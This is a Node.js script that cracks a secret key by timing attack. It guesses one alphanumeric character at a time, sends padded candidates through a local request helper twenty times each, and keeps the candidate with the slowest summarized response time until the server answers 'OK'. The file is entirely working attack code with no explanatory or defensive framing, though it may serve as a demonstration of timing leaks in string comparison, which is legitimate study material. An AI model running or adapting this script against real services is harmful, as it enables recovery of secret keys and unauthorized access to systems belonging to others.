const { makeRequest } = require("./lib/request");
const { midsummary } = require("./lib/estimator");

const L_ALPHA = 'abcdefghijklmnopqrstuvwxyz';
const U_ALPHA = L_ALPHA.toUpperCase();
const NUM = '01234567890';
const ALLOWED_CHARS = (L_ALPHA + U_ALPHA + NUM).split('');

const OBSERVATIONS_PER_CHAR = 20;

if (!process.argv[2]) {
  throw new Error('Provide key length');
}

const keyLen = Number.parseInt(process.argv[2]);

let key = '';

async function guessNextCharacter() {
  /** @type string[] */
  const candidates = ALLOWED_CHARS.map(c => key + c);

  if (candidates[0].length > keyLen) {
    console.log('Maximum length reached, but key was not found. Resetting...');
    key = '';
    setTimeout(guessNextCharacter, 0);
    return;
  }

  /**
   * @type {{ [candidate: string]: BigInt[] }}
   */
  const observations = {};
  candidates.forEach(c => observations[c] = []);

  for (let i = 0; i < OBSERVATIONS_PER_CHAR; i++) {
    for (const candidate of candidates) {
      const [res, timeDiff] = await makeRequest(candidate.padEnd(keyLen, '0'));
      if (res === 'OK') {
        console.log('KEY CRACKED: ' + candidate);
        return;
      }
      observations[candidate].push(timeDiff);
    }
  }
  const sorted = candidates
    .map(c => [c, midsummary(observations[c])])
    .sort((a, b) => b[1] - a[1]);
  key = sorted[0][0];
  console.log(key);

  setTimeout(guessNextCharacter, 0);
}

guessNextCharacter();
